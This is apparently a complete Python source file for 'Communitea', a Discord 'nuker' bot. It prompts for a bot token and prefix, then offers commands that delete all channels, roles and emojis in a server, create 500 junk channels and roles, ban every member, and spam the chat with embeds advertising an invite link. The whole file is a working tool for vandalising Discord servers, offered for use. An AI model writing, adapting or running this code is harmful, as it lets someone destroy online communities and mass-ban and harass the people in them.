import random
import os
from colorama import Fore
import colorama
import discord
from discord import Permissions
from discord.ext.commands import CommandNotFound
from discord.ext import commands

class Boje():
    info = f"{Fore.LIGHTBLACK_EX}[{Fore.LIGHTRED_EX}INFO{Fore.LIGHTBLACK_EX}] {Fore.LIGHTWHITE_EX} "
    error = f"{Fore.LIGHTBLACK_EX}[{Fore.LIGHTRED_EX}ERROR{Fore.LIGHTBLACK_EX}] {Fore.LIGHTWHITE_EX} "
    inp = f"{Fore.LIGHTBLACK_EX}[{Fore.LIGHTRED_EX}!{Fore.LIGHTBLACK_EX}] {Fore.LIGHTWHITE_EX}"
    warning = f'{Fore.LIGHTBLACK_EX}[{Fore.LIGHTYELLOW_EX}WARNING{Fore.LIGHTBLACK_EX}] {Fore.LIGHTWHITE_EX}'
    pp = f'{Fore.LIGHTRED_EX}█  {Fore.LIGHTBLACK_EX}[{Fore.RED}'
    dp = f'{Fore.LIGHTBLACK_EX}] {Fore.LIGHTWHITE_EX}'
    ppp = f'{Fore.LIGHTRED_EX}█  {Fore.LIGHTBLACK_EX}[{Fore.RED}'
    dpd = f'{Fore.LIGHTBLACK_EX}]  {Fore.LIGHTWHITE_EX}'

class Main(object):
    colorama.init(True)
    def main():
        i = 0
        ninfo = f'{Fore.LIGHTBLACK_EX}[{Fore.RED}{i}{Fore.LIGHTBLACK_EX}'
        os.system("cls")
        os.system("title Communitea - Made by Celavi (Gveklom)#0653")
        menu = (f"""

                            {colorama.Fore.RED}░█▀▀█ ░█▀▀▀█ ░█▀▄▀█ ░█▀▄▀█ ░█─░█ ░█▄─░█ ▀█▀ ▀▀█▀▀ ░█▀▀▀ ─█▀▀█ 
                            {Fore.RED}░█─── ░█──░█ ░█░█░█ ░█░█░█ ░█─░█ ░█░█░█ ░█─ ─░█── ░█▀▀▀ ░█▄▄█ 
                            {Fore.LIGHTRED_EX}░█▄▄█ ░█▄▄▄█ ░█──░█ ░█──░█ ─▀▄▄▀ ░█──▀█ ▄█▄ ─░█── ░█▄▄▄ ░█─░█



                {Boje.pp}1{Boje.dp}Exit (exit from program)                           {Boje.ppp}7{Boje.dpd}!spam (start spamming in chat)
                {Boje.pp}2{Boje.dp}!banall (ban all users)                            {Boje.ppp}8{Boje.dpd}!creater (creating random roles)
                {Boje.pp}3{Boje.dp}!deleteallc (delete all channels)                  {Boje.ppp}9{Boje.dpd}!deletealle (delete all emojis)
                {Boje.pp}4{Boje.dp}!deleteallr (delete all roles)                     {Boje.ppp}10{Boje.dpd}Discord Server
                {Boje.pp}5{Boje.dp}!unban (unban specific people)                     {Boje.ppp}11{Boje.dpd}!nuke                
                {Boje.pp}6{Boje.dp}!createc (creating random channels)                {Boje.ppp}12{Boje.dpd}!stop                  




{Fore.LIGHTRED_EX}█▀█ █░█ ▀█▀ █▀█ █░█ ▀█▀
{Fore.LIGHTRED_EX}█▄█ █▄█ ░█░ █▀▀ █▄█ ░█░

        """)
        print(menu)
        customCSR = []
        token = str(input(f"{Boje.inp}Bot Token ->  {Fore.RED}"))
        prefix = str(input(f"{Boje.inp}Bot Prefix ->  {Fore.RED}"))
        activity = str(input(f"{Boje.inp}Bot Activity ->  {Fore.RED}"))
        print("")
        odabir = str(input(f"{Boje.inp}Custom Channel,Spam,Roles(Y/N) ->  {Fore.RED}"))
        
        if(odabir == "Y" or odabir == "y" or odabir == "yes" or odabir == "YES" or odabir == "Yes"):
            for k in range(3):
                customUnos = str(input(f"{Boje.inp}Custom Name - [{k}] ->  {Fore.RED}"))
                customCSR.append(customUnos)
        elif(odabir == "N" or odabir == "n" or odabir == "no" or odabir == "NO" or odabir == "No"):
            print(f'{Boje.info} Your answer is "{odabir}".')
            customCSR.append("Nuked")
            customCSR.append("Communitea")
            customCSR.append("https://discord.gg/FszNmNgagt")
        else:
            print(f"{Boje.error} Your selection is not offered.")
        intents = discord.Intents.all()
        client = commands.Bot(command_prefix=prefix, intents=intents)


        @client.event
        async def on_command_error(ctx, error):
            if isinstance(error, commands.MissingRequiredArgument):
                print(f"{Boje.error} The user wrote something wrong.")
            if isinstance(error, commands.MissingPermissions):
                print(f"{Boje.error} User don't have permission for this command.")
            if isinstance(error, CommandNotFound):
                print(f"{Boje.warning} The user called a command that does not exist.")

                    

        @client.event
        async def on_ready():
            print("""
            """)
            print(f'{Boje.info} Bot has started!')
            await client.change_presence(activity=discord.Game(name=activity))


        @client.command()
        async def nuke(ctx):
            i = 0
            ninfo = f'{Fore.LIGHTBLACK_EX}[{Fore.RED}{i}{Fore.LIGHTBLACK_EX}]'
            try:
                guild = ctx.guild
                for channel in guild.channels:
                    i += 1
                    await channel.delete()
                    print(f'{Boje.info} Channel successfully deleted - {ninfo}')
            except:
                print(f'{Boje.error} Channel was not deleted.')

            guild = ctx.guild
            i = 0
            for role in guild.roles:
                i += 1
                try:
                    await role.delete()
                    print(f'{Boje.info} was successfully deleted - {ninfo}')
                except:
                    print(f'{Boje.error} was not delete.')


            i = 0
            for emoji in list(ctx.guild.emojis):
                i += 1
                try:
                    await emoji.delete()
                    print(f'{Boje.info} Emoji was successfully deleted - {ninfo}')
                except:
                    print(f'{Boje.error} Emoji was not deleted.')

            for i in range(500):
                try:
                    randList = random.choice(customCSR)
                    guild = ctx.message.guild
                    await guild.create_text_channel(randList)
                    print(f'{Boje.info} Channel successfully created - {ninfo}')
                except:
                    print(f'{Boje.error} Channel was not created.')

            for i in range(500):
                try:
                    random_role = random.choice(customCSR)
                    guild = ctx.guild
                    await guild.create_role(name=f"{random_role}")
                    print(f'{Boje.info} Role successfully created - {ninfo}')
                except:
                    print(f'{Boje.error} Role was not created.')

            for user in ctx.guild.members:
                try:
                    await user.ban()
                    print(f'{Boje.info} {user} was successfully banned from Server.')
                except:
                    print(f'{Boje.error} {user} was not banned from Server.')
                    pass

            print(f'{Boje.info} Spam has started.')
            for i in range(100):
                random_message = random.choice(customCSR)
                await ctx.send(random_message)
            print(f'{Boje.info} Spam is over.')

        @client.command()
        async def deleteallc(ctx):
            i = 0
            try:
                guild = ctx.guild
                for channel in guild.channels:
                    i += 1
                    await channel.delete()
                    print(f'{Boje.info} Channel successfully deleted - {ninfo}')
            except:
                print(f'{Boje.error} Channel was not deleted.')
                

        @client.command()
        async def deleteallr(ctx):
            guild = ctx.guild
            i = 0
            for role in guild.roles:
                i += 1
                try:
                    await role.delete()
                    print(f'{Boje.info} {role.name} was successfully deleted - {ninfo}')
                except:
                    print(f'{Boje.error} {role.name} was not delete.')

        @client.command()
        async def deletealle(ctx):
            i = 0
            for emoji in list(ctx.guild.emojis):
                i += 1
                try:
                    await emoji.delete()
                    print(f'{Boje.info} Emoji was successfully deleted - {ninfo}')
                except:
                    print(f'{Boje.error} Emoji was not deleted.')


        @client.command()
        async def createc(ctx):
            for i in range(500):
                try:
                    randList = random.choice(customCSR)
                    guild = ctx.message.guild
                    await guild.create_text_channel(randList)
                    print(f'{Boje.info} Channel successfully created - {ninfo}')
                except:
                    print(f'{Boje.error} Channel was not created.')

        @client.command()
        async def creater(ctx):
            for i in range(500):
                try:
                    random_role = random.choice(customCSR)
                    guild = ctx.guild
                    await guild.create_role(name=f"{random_role}")
                    print(f'{Boje.info} Role successfully created - {ninfo}')
                except:
                    print(f'{Boje.error} Role was not created.')

        @client.command()
        async def banall(ctx):
            for user in ctx.guild.members:
                try:
                    await user.ban()
                    print(f'{Boje.info} {user} was successfully banned from Server.')
                except:
                    print(f'{Boje.error} {user} was not banned from Server.')
                    pass

        @client.command()
        async def spam(ctx):
            print(f'{Boje.info} Spam has started.')
            for i in range(100):
                random_color = random.choice([0x00ff00,0xFF0000,0x00FDFF,0xE500FF])
                random_message = random.choice(customCSR)
                embed = discord.Embed(title = "Communitea - Official Nuker", value = random_message, inline = False, color = random_color)
                embed.add_field(name = random_message, value = random_message)
                await ctx.send(embed = embed)
            print(f'{Boje.info} Spam is over.')

        @client.command()
        async def unban(ctx, *, member):
            banned_users = await ctx.guild.bans()
            member_name, member_discriminator = member.split('#')

            for ban_entry in banned_users:
                user = ban_entry.user
            
            if (user.name, user.discriminator) == (member_name, member_discriminator):
                await ctx.guild.unban(user)
                print(f'{Boje.info} {user} have been unbanned sucessfully')
                return


        client.run(token)

if (__name__ == '__main__'):
    Main.main()
